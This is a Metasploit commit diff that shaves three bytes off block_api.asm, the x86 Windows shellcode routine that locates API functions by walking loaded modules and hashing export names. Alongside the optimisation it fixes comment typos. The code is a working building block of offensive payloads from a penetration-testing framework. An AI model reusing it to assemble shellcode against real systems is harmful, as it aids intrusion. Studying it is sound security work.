c29c6be212ff737e58a959a1b3aed05479b96ff4
James Lee <egypt@metasploit.com>
2014-01-14 03:00:11 -0600

    Shave 3 bytes off of block_api

--- external/source/shellcode/windows/x86/src/block/block_api.asm
+++ external/source/shellcode/windows/x86/src/block/block_api.asm
@@ -23,7 +23,7 @@ api_call:
   mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
 next_mod:                ;
   mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
-  movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
+  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
   xor edi, edi           ; Clear EDI which will store the hash of the module name
 loop_modname:            ;
   xor eax, eax           ; Clear EAX
@@ -34,22 +34,25 @@ loop_modname:            ;
 not_lowercase:           ;
   ror edi, 13            ; Rotate right our hash value
   add edi, eax           ; Add the next byte of the name
-  loop loop_modname      ; Loop untill we have read enough
+  loop loop_modname      ; Loop until we have read enough
+
   ; We now have the module hash computed
   push edx               ; Save the current position in the module list for later
   push edi               ; Save the current module hash for later
-  ; Proceed to itterate the export address table, 
+  ; Proceed to iterate the export address table,
   mov edx, [edx+16]      ; Get this modules base address
   mov eax, [edx+60]      ; Get PE header
-  add eax, edx           ; Add the modules base address
-  mov eax, [eax+120]     ; Get export tables RVA
-  test eax, eax          ; Test if no export address table is present
-  jz get_next_mod1       ; If no EAT present, process the next module
-  add eax, edx           ; Add the modules base address
-  push eax               ; Save the current modules EAT
-  mov ecx, [eax+24]      ; Get the number of function names  
-  mov ebx, [eax+32]      ; Get the rva of the function names
+
+  ; use ecx as our EAT pointer here so we can take advantage of jecxz.
+  mov ecx, [eax+edx+120] ; Get the EAT from the PE header
+  jecxz get_next_mod1    ; If no EAT present, process the next module
+  add ecx, edx           ; Add the modules base address
+  push ecx               ; Save the current modules EAT
+  mov ebx, [ecx+32]      ; Get the rva of the function names
   add ebx, edx           ; Add the modules base address
+  mov ecx, [ecx+24]      ; Get the number of function names
+  ; now ecx returns to its regularly scheduled counter duties
+
   ; Computing the module hash + function hash
 get_next_func:           ;
   jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
@@ -66,14 +69,15 @@ loop_funcname:           ;
   cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
   jne loop_funcname      ; If we have not reached the null terminator, continue
   add edi, [ebp-8]       ; Add the current module hash to the function hash
-  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
+  cmp edi, [ebp+36]      ; Compare the hash to the one we are searching for
   jnz get_next_func      ; Go compute the next function hash if we have not found it
+
   ; If found, fix up stack, call the function and then value else compute the next one...
   pop eax                ; Restore the current modules EAT
-  mov ebx, [eax+36]      ; Get the ordinal table rva      
+  mov ebx, [eax+36]      ; Get the ordinal table rva
   add ebx, edx           ; Add the modules base address
   mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
-  mov ebx, [eax+28]      ; Get the function addresses table rva  
+  mov ebx, [eax+28]      ; Get the function addresses table rva
   add ebx, edx           ; Add the modules base address
   mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
   add eax, edx           ; Add the modules base address to get the functions actual VA
@@ -88,6 +92,7 @@ finish:
   push ecx               ; Push back the correct return value
   jmp eax                ; Jump into the required function
   ; We now automagically return to the correct caller...
+
 get_next_mod:            ;
   pop eax                ; Pop off the current (now the previous) modules EAT
 get_next_mod1:           ;
